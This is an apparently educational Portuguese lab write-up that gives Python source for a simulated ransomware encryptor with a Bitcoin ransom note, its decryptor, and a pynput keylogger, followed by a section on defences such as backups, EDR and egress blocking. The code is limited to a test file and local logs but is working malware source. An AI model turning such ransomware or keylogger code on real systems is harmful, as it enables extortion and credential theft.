🛡️ Projeto Prático: Simulação de Malware para Fins Educacionais (Ransomware & Keylogger)

1.  Ransomware Simulado (Python)
O ransomware é um tipo de malware que sequestra dados utilizando algoritmos de criptografia. No nosso laboratório, utilizamos a biblioteca cryptography em Python para demonstrar a criptografia simétrica (AES/Fernet).

 Script de Criptografia (encryptor.py)
    
    .Python
    .import os
    .from cryptography.fernet import Fernet

# . Gera e salva a chave de criptografia (em um cenário real, o atacante reteria essa chave)

    .key = Fernet.generate_key()
    .with open("chavesecreta.key", "wb") as key_file:
        .key_file.write(key)

    .fernet = Fernet(key)

# . Cria um arquivo de teste para simular o alvo

    .with open("teste.txt", "w") as f:
        .f.write("Informações confidenciais da empresa X. Seus dados foram comprometidos!")


# . Criptografa o arquivo de teste

    .target_file = "teste.txt"
    .with open(target_file, "rb") as file:
        .file_data = file.read()
    
    .encrypted_data = fernet.encrypt(file_data)
    
    .with open(target_file, "wb") as file:
        .file.write(encrypted_data)


# . Cria a mensagem de resgate

    .with open("LEIA_ISSO.txt", "w") as ransom_note:
        .ransom_note.write(
           . "SEUS DADOS FORAM CRIPTOGRAFADOS!\n"
           . "Para recuperar seus arquivos, envie 1 BitCoin para a carteira XXXXX.\n"
            ."Depois envie o comprovante para recuperar sua chave."
        .)
    .print("[+] Mensagem de resgate gerada.")

 Script de Descriptografia (decryptor.py)

    .Python
    .from cryptography.fernet import Fernet

# . Carrega a chave secreta gerada anteriormente

    .with open("chavesecreta.key", "rb") as key_file:
        .key = key_file.read()
    
    .fernet = Fernet(key)

# . Descriptografa o arquivo alvo

    .target_file = "teste.txt"
    .with open(target_file, "rb") as file:
        .encrypted_data = file.read()
    
    .decrypted_data = fernet.decrypt(encrypted_data)
    
    .with open(target_file, "wb") as file:
        .file.write(decrypted_data)

2.  Keylogger Simulado (Python)
   
O Keylogger é um spyware voltado para a captura de teclas digitadas no teclado, muito utilizado para roubo de credenciais e senhas.

 Script de Captura (keylogger_simulado.py)


    .Python
    .from pynput import keyboard
    
    .log_file = "key_log.txt"
    
    .def on_press(key):
        .try:
            .# Tenta registrar o caractere digitado
           . with open(log_file, "a") as f:
                .f.write(f"{key.char}")
        .except AttributeError:
            .# Trata teclas especiais (ex: Espaço, Enter, Backspace)
            .with open(log_file, "a") as f:
                .if key == key.space:
                    .f.write(" ")
                .elif key == key.enter:
                    .f.write("\n")
                .else:
                    .f.write(f" [{key.name}] ")

    .# Configura o listener do teclado (rodará por alguns segundos ou até ser interrompido)
    .print("[*] Keylogger iniciado. Pressione Ctrl+C no terminal para parar.")
    .with keyboard.Listener(on_press=on_press) as listener:
       .listener.join()

   
3.  Reflexão sobre Defesa e Mitigação
Compreender o funcionamento dessas ameaças nos permite mapear camadas de segurança eficazes (abordagem de Defesa em Profundidade):

Backups Regulares (3-2-1): A melhor arma contra Ransomwares. Manter cópias offline e imutáveis garante que, em caso de sequestro de dados, a empresa não precise pagar resgate.

Soluções EDR e Antivírus Modernos: Ferramentas baseadas em comportamento conseguem detectar acessos em massa a arquivos (característico de Ransomwares) ou chamadas de API suspeitas ligadas ao gancho de teclado (pynput / hooks do Windows).

Princípio do Menor Privilégio (PoLP): Restringir permissões de escrita de usuários comuns em pastas críticas do sistema impede que um ransomware criptografe toda a rede corporativa a partir de uma conta comum.

Conscientização de Usuários (Phishing Awareness): A maior parte dos keyloggers e ransomwares entra por engenharia social (e-mails falsos, anexos maliciosos). Treinar colaboradores é o firewall humano mais eficiente.

Monitoramento de Rede e Firewall: Bloquear conexões de saída (Exfiltração de Dados) impede que um keylogger envie logs capturados por e-mail ou servidores C2 (Command and Control).
